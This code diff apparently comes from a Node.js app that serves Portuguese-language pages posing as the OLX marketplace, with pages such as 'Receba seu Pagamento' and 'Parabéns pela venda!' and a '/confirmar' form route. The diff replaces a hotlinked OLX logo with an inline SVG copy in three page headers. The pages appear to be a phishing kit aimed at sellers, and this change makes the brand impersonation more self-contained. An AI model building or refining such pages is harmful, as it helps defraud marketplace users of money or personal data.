@@ -510,9 +510,7 @@ if (process.env.NODE_ENV === 'production') {
     </head>
     <body>
         <header>
-            <img src="https://seeklogo.com/images/O/olx-logo-8D3DF7BBA9-seeklogo.com.png" alt="Logo OLX">
-            <span>OLX - Vendas Rápidas</span>
-        </header>
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
 
         <div class="container">
             <div class="seller-info">
@@ -783,10 +781,8 @@ if (process.env.NODE_ENV === 'production') {
                   margin-right: 10px;
               }
       </style>
-          <header>
-              <img src="https://seeklogo.com/images/O/olx-logo-8D3DF7BBA9-seeklogo.com.png" alt="Logo OLX">
-              <span>OLX - Vendas Rápidas</span>
-          </header>
+         <header>
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
   
           <div class="venda-realizada">
               Receba seu Pagamento
@@ -1007,9 +1003,7 @@ app.post('/confirmar', async (req, res) => {
 
    </style>
     <header>
-              <img src="https://seeklogo.com/images/O/olx-logo-8D3DF7BBA9-seeklogo.com.png" alt="Logo OLX">
-              <span>OLX - Vendas Rápidas</span>
-          </header>
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
     <div class="min-h-screen flex items-center justify-center p-4">
         <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-orange-500">
             <h2 class="text-xl font-bold text-purple-700 mb-4">Parabéns pela venda!</h2>
